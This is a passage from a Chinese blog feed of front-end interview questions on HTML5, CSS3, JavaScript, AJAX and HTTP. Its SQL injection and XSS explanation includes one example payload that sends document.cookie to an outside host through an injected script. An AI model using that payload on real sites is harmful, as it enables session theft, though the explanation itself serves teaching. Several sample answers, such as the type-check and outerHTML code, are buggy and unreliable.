type=<span class="string">"audio/mpeg"</span>&gt; </span><br><span class="line">   Your browser does<span class="string">'nt support audio embedding feature. </span></span><br><span class="line"><span class="string">&lt;/audio&gt;</span></span><br></pre></td></tr></table></figure><h2 id="16、如何在-HTML5-页面中嵌入视频？"><a href="#16、如何在-HTML5-页面中嵌入视频？" class="headerlink" title="16、如何在 HTML5 页面中嵌入视频？"></a>16、如何在 HTML5 页面中嵌入视频？</h2><p>和音频一样，HTML5 定义了嵌入视频的标准方法，支持的格式包括：MP4、WebM 和 Ogg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;video width=<span class="string">"450"</span> height=<span class="string">"340"</span> controls&gt; </span><br><span class="line">  &lt;source src=<span class="string">"jamshed.mp4"</span> type=<span class="string">"video/mp4"</span>&gt; </span><br><span class="line">   Your browser does<span class="string">'nt support video embedding feature. </span></span><br><span class="line"><span class="string">&lt;/video&gt;</span></span><br></pre></td></tr></table></figure><h2 id="17、HTML5-引入什么新的表单属性"><a href="#17、HTML5-引入什么新的表单属性" class="headerlink" title="17、HTML5 引入什么新的表单属性"></a>17、HTML5 引入什么新的表单属性</h2><blockquote><p>Datalist<br>datetime<br>output<br>keygen<br>date<br>month<br>week<br>time<br>number<br>range<br>emailurl</p></blockquote><h2 id="18、描述一段语义的html代码"><a href="#18、描述一段语义的html代码" class="headerlink" title="18、描述一段语义的html代码"></a>18、描述一段语义的html代码</h2><p>（HTML5中新增加的很多标签（如：<code>&lt;article&gt;</code>、<code>&lt;nav&gt;</code>、<code>&lt;header&gt;</code>和<code>&lt;footer&gt;</code>等，就是基于语义化设计原则）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;header&quot;&gt;</span><br><span class="line">&lt;h1&gt;标题&lt; /h1&gt;</span><br><span class="line">&lt;h2&gt;专注Web前端技术&lt; /h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>语义 HTML 具有以下特性：</p><blockquote><p>文字包裹在元素中，用以反映内容。例如：<br>段落包含在 <code>&lt;p&gt;</code> 元素中。<br>顺序表包含在<code>&lt;ol&gt;</code>元素中。<br>从其他来源引用的大型文字块包含在<code>&lt;blockquote&gt;</code>元素中。<br>HTML 元素不能用作语义用途以外的其他目的。例如：<br><code>&lt;h1&gt;</code>包含标题，但并非用于放大文本。<br><code>&lt;blockquote&gt;</code>包含大段引述，但并非用于文本缩进。<br>空白段落元素 ( <code>&lt;p&gt;&lt;/p&gt;</code> ) 并非用于跳行。<br>文本并不直接包含任何样式信息。例如：<br>不使用 <code>&lt;font&gt;</code> 或<code>&lt;center&gt;</code> 等格式标记。<br>类或 ID 中不引用颜色或位置。</p></blockquote><h2 id="19、HTML5和CSS3的新标签"><a href="#19、HTML5和CSS3的新标签" class="headerlink" title="19、HTML5和CSS3的新标签"></a>19、HTML5和CSS3的新标签</h2><blockquote><p>HTML5： nav, footer, header, section, hgroup, video, time, canvas, audio…<br>CSS3: RGBA, opacity, text-shadow, box-shadow, border-radius, border-image, border-color, transform…;</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、CSS3有哪些新特性&quot;&gt;&lt;a href=&quot;#1、CSS3有哪些新特性&quot; class=&quot;headerlink&quot; title=&quot;1、CSS3有哪些新特性&quot;&gt;&lt;/a&gt;1、CSS3有哪些新特性&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;CSS3实现圆角（border-radius），阴影（box-shadow），&lt;br&gt;对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）&lt;br&gt;transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜&lt;br&gt;增加了更多的CSS选择器&lt;br&gt;多背景&lt;br&gt;rgba、hlsa&lt;br&gt;在CSS3中唯一引入的伪元素是 ::selection.&lt;br&gt;媒体查询，多栏布局&lt;br&gt;border-image&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="HTML5，CSS3" scheme="http://yoursite.com/tags/HTML5%EF%BC%8CCSS3/"/>
    
  </entry>
  
  <entry>
    <title>题库-js篇(下)</title>
    <link href="http://yoursite.com/2016/05/18/%E9%A2%98%E5%BA%93-js%E7%AF%87%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://yoursite.com/2016/05/18/题库-js篇（下）/</id>
    <published>2016-05-17T16:00:00.000Z</published>
    <updated>2018-06-05T06:28:08.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串"><a href="#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串" class="headerlink" title="写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串"></a>写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串</h3><p><code>^[a-zA-Z]{1}[\w]{5,29}$</code></p><h3 id="写出正确的正则表达式匹配固话号"><a href="#写出正确的正则表达式匹配固话号" class="headerlink" title="写出正确的正则表达式匹配固话号"></a>写出正确的正则表达式匹配固话号</h3><p>区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号</p><p><code>^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$</code></p><h3 id="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"><a href="#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成" class="headerlink" title="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"></a>要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成</h3><p><code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$</code></p><h2 id="输出结果是"><a href="#输出结果是" class="headerlink" title="输出结果是"></a>输出结果是</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var bool = !!2; </span><br><span class="line">alert(bool)；//true;</span><br></pre></td></tr></table></figure><p>双向非操作可以把字符串和数字转换为布尔值。</p><a id="more"></a><h2 id="声明对象，添加属性，输出属性"><a href="#声明对象，添加属性，输出属性" class="headerlink" title="声明对象，添加属性，输出属性"></a>声明对象，添加属性，输出属性</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'leipeng'</span>,</span><br><span class="line">  showName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.showName();</span><br></pre></td></tr></table></figure><h2 id="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"><a href="#匹配输入的字符：第一个必须是字母或下划线开头，长度5-20" class="headerlink" title="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"></a>匹配输入的字符：第一个必须是字母或下划线开头，长度5-20</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^[a-zA-Z_][a-zA-Z0-9_]&#123;5,20&#125;/</span>,</span><br><span class="line">    name1 = <span class="string">'leipeng'</span>,</span><br><span class="line">    name2 = <span class="string">'0leipeng'</span>,</span><br><span class="line">    name3 = <span class="string">'你好leipeng'</span>,</span><br><span class="line">    name4 = <span class="string">'hi'</span>;</span><br><span class="line">alert(reg.test(name1));</span><br><span class="line">alert(reg.test(name2));</span><br><span class="line">alert(reg.test(name3));</span><br><span class="line">alert(reg.test(name4));</span><br></pre></td></tr></table></figure><h2 id="检测变量类型"><a href="#检测变量类型" class="headerlink" title="检测变量类型"></a>检测变量类型</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkStr</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str == <span class="string">'string'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(checkStr(<span class="string">"aaa"</span>));</span><br></pre></td></tr></table></figure><h2 id="如何在HTML中添加事件"><a href="#如何在HTML中添加事件" class="headerlink" title="如何在HTML中添加事件"></a>如何在HTML中添加事件</h2><blockquote><p>标签之中直接添加 onclick=”fun()”;<br>JS添加 Eobj.onclick = method;<br>现代事件 IE： obj.attachEvent(‘onclick’, method)；<br>FF: obj.addEventListener(‘click’, method, false);</p></blockquote><h2 id="BOM对象有哪些，列举window对象"><a href="#BOM对象有哪些，列举window对象" class="headerlink" title="BOM对象有哪些，列举window对象"></a>BOM对象有哪些，列举window对象</h2><blockquote><p>window对象 ，是JS的最顶层对象，其他的BOM对象都是window对象的属性；<br>document对象，文档对象；<br>location对象，浏览器当前URL信息；<br>navigator对象，浏览器本身信息；<br>screen对象，客户端屏幕信息；<br>history对象，浏览器访问历史信息；</p></blockquote><h2 id="代码实现-outerHTML"><a href="#代码实现-outerHTML" class="headerlink" title="代码实现 outerHTML"></a>代码实现 outerHTML</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//说明：outerHTML其实就是innerHTML再加上本身；</span></span><br><span class="line">  <span class="built_in">Object</span>.prototype.outerHTML = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> innerCon = <span class="keyword">this</span>.innerHTML, <span class="comment">//获得里面的内容</span></span><br><span class="line">        outerCon = <span class="keyword">this</span>.appendChild(innerCon); <span class="comment">//添加到里面</span></span><br><span class="line">    alert(outerCon); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>演示代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">"outer"</span>&gt;</span><br><span class="line">       hello</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script&gt;</span></span><br><span class="line"><span class="regexp">    Object.prototype.outerHTML = function() &#123;</span></span><br><span class="line"><span class="regexp">      var innerCon = this.innerHTML, /</span><span class="regexp">/获得里面的内容</span></span><br><span class="line"><span class="regexp">      outerCon = this.appendChild(innerCon); /</span><span class="regexp">/添加到里面</span></span><br><span class="line"><span class="regexp">      alert(outerCon); </span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    function $(id)&#123;</span></span><br><span class="line"><span class="regexp">      return document.getElementById(id);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    alert($('outer').innerHTML);</span></span><br><span class="line"><span class="regexp">    alert($('outer').outerHTML);</span></span><br><span class="line"><span class="regexp">  &lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h2 id="JS中的简单继承-call方法！"><a href="#JS中的简单继承-call方法！" class="headerlink" title="JS中的简单继承 call方法！"></a>JS中的简单继承 call方法！</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意：类名都是首字母大写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name, money</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.money = money;</span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name+<span class="string">' 钱： '</span>+ <span class="keyword">this</span>.money);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义孩子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Children</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name); <span class="comment">//继承 姓名属性，不要钱。  </span></span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化类</span></span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Parent(<span class="string">'parent'</span>, <span class="number">800000000000</span>);</span><br><span class="line"><span class="keyword">var</span> chi = <span class="keyword">new</span> Children(<span class="string">'child'</span>);</span><br><span class="line">per.info();</span><br><span class="line">chi.info();</span><br></pre></td></tr></table></figure><h2 id="bind-live-delegate-的区别"><a href="#bind-live-delegate-的区别" class="headerlink" title="bind(), live(), delegate()的区别"></a>bind(), live(), delegate()的区别</h2><blockquote><p>bind： 绑定事件，对新添加的事件不起作用，方法用于将一个处理程序附加到每个匹配元素的事件上并返回jQuery对象。<br>live： 方法将一个事件处理程序附加到与当前选择器匹配的所有元素（包含现有的或将来添加的）的指定事件上并返回jQuery对象。<br>delegate： 方法基于一组特定的根元素将处理程序附加到匹配选择器的所有元素（现有的或将来的）的一个或多个事件上。</p></blockquote><h2 id="如何优化自己的代码"><a href="#如何优化自己的代码" class="headerlink" title="如何优化自己的代码"></a>如何优化自己的代码</h2><blockquote><p>代码重用<br>避免全局变量（命名空间，封闭空间，模块化mvc..）<br>拆分函数避免函数过于臃肿<br>注释</p></blockquote><h2 id="怎样实现两栏等高"><a href="#怎样实现两栏等高" class="headerlink" title="怎样实现两栏等高"></a>怎样实现两栏等高</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=<span class="string">"container"</span> style=<span class="string">"display: table; width: 100%;"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"left"</span> style=<span class="string">"background-color: red; display: table-cell;"</span>&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div style="display:table-cell;"&gt;&lt;/</span>div&gt;</span><br><span class="line">    &lt;div id=<span class="string">"right"</span> style=<span class="string">"background-color: blue;display: table-cell"</span>&gt;</span><br><span class="line">        内容</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure><h2 id="使用js实现这样的效果"><a href="#使用js实现这样的效果" class="headerlink" title="使用js实现这样的效果"></a>使用js实现这样的效果</h2><p>在文本域里输入文字时，当按下enter键时不换行，而是替换成 <code>\{\{enter\}\}</code>, (只需要考虑在行尾按下enter键的情况).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    function back(ele,event)&#123;</span><br><span class="line">      event = event || window.event;</span><br><span class="line">      if(event.keyCode==13)&#123;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">        ele.value+=&quot;&#123;&#123;enter&#125;&#125;&quot;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;textarea rows=&quot;3&quot; cols=&quot;40&quot; id=&quot;te&quot; onkeypress=&quot;back(this,event);&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="以下代码中end字符串什么时候输出"><a href="#以下代码中end字符串什么时候输出" class="headerlink" title="以下代码中end字符串什么时候输出"></a>以下代码中end字符串什么时候输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var t=true;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(123);</span><br><span class="line">  t = false;</span><br><span class="line">&#125;, 1000);</span><br><span class="line">while(t)&#123;&#125;</span><br><span class="line">console.log(&apos;end&apos;);</span><br></pre></td></tr></table></figure><blockquote><p>结果：永远不输出</p></blockquote><h2 id="实现specify函数"><a href="#实现specify函数" class="headerlink" title="实现specify函数"></a>实现specify函数</h2><p><code>specify(&#39;hello,world&#39;) // =&gt;&#39;h,e,l,l,o,w,o,r,l,d&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function specify(str)&#123;</span><br><span class="line">  var tempArray =  Array.prototype.filter.call(str,function (value, index, array) &#123;</span><br><span class="line">      return value &gt;= &apos;A&apos; &amp;&amp;  value &lt;= &apos;z&apos; &amp;&amp; value != &quot;_&quot;;</span><br><span class="line">  &#125;);</span><br><span class="line">  return tempArray.join(&quot;,&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(specify(&quot;hedd____df*(%$#a !!!))))))llo,Wo@@@r        ld&quot;)); //h,e,l,l,o,W,o,r,l,d</span><br></pre></td></tr></table></figure><h2 id="简述-readyonly-与-disabled-的区别"><a href="#简述-readyonly-与-disabled-的区别" class="headerlink" title="简述 readyonly 与 disabled 的区别"></a>简述 readyonly 与 disabled 的区别</h2><p>ReadOnly 和 Disabled的作用是使用户不能够更改表单域中的内容.</p><p>但是二者还是有着一些区别的：</p><p>1、Readonly只针对input(text/password)和textarea有效，而disabled对于所有的表单元素有效，包括select,radio,checkbox,button等。</p><p>2、在表单元素使用了disabled后，我们将表单以POST或者GET的方式提交的话，这个元素的值不会被传递出去，而readonly会将该值传递出去</p><h2 id="解释ajax的工作原理"><a href="#解释ajax的工作原理" class="headerlink" title="解释ajax的工作原理"></a>解释ajax的工作原理</h2><blockquote><p>Ajax的工作原理相当于在用户和服务器之间加了—个中间层，使用户操作与服务器响应异步化;<br>这样把以前的一些服务器负担的工作转嫁到客户端，利于客户端闲置的处理能力来处理;<br>减轻服务器和带宽的负担，从而达到节约 ISP 的空间及带宽租用成本的目的。<br>简单来说通过 XmlHttpRequest 对象来向服务器发异步请求<br>从服务器获得数据<br>然后用javascript来操作DOM而更新页面</p></blockquote><p>这其中最关键的一步就是从服务器获得请求数据。要清楚这个过程和原理，我们必须对 XMLHttpRequest有所了解。</p><h2 id="为什么扩展javascript内置对象不是好的做法？"><a href="#为什么扩展javascript内置对象不是好的做法？" class="headerlink" title="为什么扩展javascript内置对象不是好的做法？"></a>为什么扩展javascript内置对象不是好的做法？</h2><p>因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。</p><h2 id="什么是三元表达式？"><a href="#什么是三元表达式？" class="headerlink" title="什么是三元表达式？"></a>什么是三元表达式？</h2><p>三元运算符:</p><p>三元如名字表示的三元运算符需要三个操作数。</p><blockquote><p>语法是 <code>条件 ? 结果1 : 结果2;</code></p></blockquote><p>这里你把条件写在问号(?)的前面后面跟着用冒号(:)分隔的结果1和结果2。满足条件时结果1否则结果2。</p><h2 id="HTTP协议中，GET和POST有什么区别？分别适用什么场景-？"><a href="#HTTP协议中，GET和POST有什么区别？分别适用什么场景-？" class="headerlink" title="HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？"></a>HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？</h2><ul><li>GET没有请求主体，使用xhr.send(null)</li><li>GET可以通过在请求URL上添加请求参数</li><li>POST可以通过xhr.send(‘name=itcast&amp;age=10’)</li><li>POST需要设置</li><li>GET效率更好（应用多）</li><li>GET大小限制约4K，POST则没有限制</li></ul><h2 id="HTTP状态消息200-302-304-403-404-500分别表示什么"><a href="#HTTP状态消息200-302-304-403-404-500分别表示什么" class="headerlink" title="HTTP状态消息200 302 304 403 404 500分别表示什么"></a>HTTP状态消息200 302 304 403 404 500分别表示什么</h2><ul><li>200 代表成功</li><li>304 文档未修改</li><li>403 没有权限</li><li>404 未找到</li><li>500 服务器错误</li></ul><h2 id="HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）"><a href="#HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）" class="headerlink" title="HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）"></a>HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）</h2><p>last-modified 文档的最后改动时间。</p><p>客户可以通过 If-Modified-Since 请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。<br>Last-Modified 也可用 setDateHeader 方法来设置。</p><p>cache-control 告诉所有的缓存机制是否可以缓存及哪种类型</p><p>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</p><p><a href="http://blog.chinaunix.net/" target="_blank" rel="noopener">header标头说明</a></p><h2 id="业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）"><a href="#业界常用的优化-WEB-页面加载速度的方法（可以分别从页面元素展现，请求连接，css-js-服务器等方面介绍）" class="headerlink" title="业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）"></a>业界常用的优化 WEB 页面加载速度的方法（可以分别从页面元素展现，请求连接，css,js,服务器等方面介绍）</h2><p>1) 优化图像，使用 CSS Sprites 整合图像<br>2) 去掉不必要的插件<br>3) 减少DNS查询(DNS lookups)<br>4) 最小化重定向，重定向增加了额外的HTTP请求<br>5) 使用内容分发网络（Content Delivery Network CDN）<br>6) 把CSS文件放在页面顶部，而JS文件放在底部<br>7) 利用浏览器缓存<br>8) 压缩CSS和JavaScript<br>9) 启用GZIP压缩</p><blockquote><p>使用良好的结构;<br>不要使布局超载;<br>不要使用图像来表示文本，图像进行导航不利于 SEO;<br>检查 cookie 使用情况;<br>尽可能避免使用表格;<br>删除任何不必要的元素;<br>一些优化网页的技巧;<br>压缩和缩小 JavaScript 文件;<br>设置图像大小;<br>将 CSS 图像映射用于装饰功能;<br>尽可能延迟脚本加载;<br>按需加载 JavaScript 文件;<br>优化 CSS 文件;<br>使用内容分布网络;<br>对资产使用多个域来增加连接;<br>在合适的时候使用 Google Gears;<br>使用 PNG 格式的图像;<br>保持 Ajax 调用简短、准确;<br>进行一次较大的 Ajax 调用并在本地处理客户机数据;<br>在沙箱中测试代码;<br>分析站点代码;<br>使用 JSLint 检查 JavaScript 代码中的错误或糟糕的编码实践;<br>检查孤立的文件和丢失的图像 ;<br>YSlow 扩展：使用 YSlow 分析网页;</p></blockquote><p><a href="http://www.cnblogs.com/xp796/p/5236945.html" target="_blank" rel="noopener">25种提高网页加载速度的方法和技巧</a></p><h2 id="列举常用的-web-页面开发，调试以及优化工具"><a href="#列举常用的-web-页面开发，调试以及优化工具" class="headerlink" title="列举常用的 web 页面开发，调试以及优化工具"></a>列举常用的 web 页面开发，调试以及优化工具</h2><p>开发工具：PS、FireWorks、WebStrom、SubLime Text、Eclipse、Aptana、DreamWeaver、NotePad++、Yslow<br>调试工具：谷歌浏览器、火狐 FireBug、IETester、HTTPWatch Stadio<br>优化工具：gulp、grunt、webpack<br>使用率较高的框架有 jQuery、YUI、Prototype、Dojo、Ext.js、Mootools等。尤其是jQuery，超过91%。<br>轻量级框架有 Modernizr、underscore.js、backbone.js、Raphael.js等。</p><h2 id="解释什么是sql注入，xss漏洞"><a href="#解释什么是sql注入，xss漏洞" class="headerlink" title="解释什么是sql注入，xss漏洞"></a>解释什么是sql注入，xss漏洞</h2><p>所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。<br>在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。</p><p>XSS又叫CSS (Cross Site Script) ，跨站脚本攻击。<br>它指的是恶意攻击者往Web页面里插入恶意脚本代码，而程序对于用户输入内容未过滤；当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。<br>1)恶意用户，在一些公共区域（例如，建议提交表单或消息公共板的输入表单）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。<br>如：<code>http://xxx.xxx.com.cn/intf/_photos.jsp?callback=&lt;script&gt;window.location.href=&quot;http://www.baidu.com?a=&quot; + escape(document.cookie)&lt;/script&gt;、参数&lt;script&gt;xxx&lt;/script&gt;</code>如果这里没有经过转义处理，则页面中就嵌入了一段script。<br>2)恶意提交这个表单<br>3)其他用户看到这个包括恶意脚本的页面并执行，获取用户的cookie等敏感信息。</p><h2 id="请列举js数组类型中的常用方法"><a href="#请列举js数组类型中的常用方法" class="headerlink" title="请列举js数组类型中的常用方法"></a>请列举js数组类型中的常用方法</h2><ul><li>push();<ul><li>尾部追加一个或多个元素，push 一个元素与给数组 a[a.length] 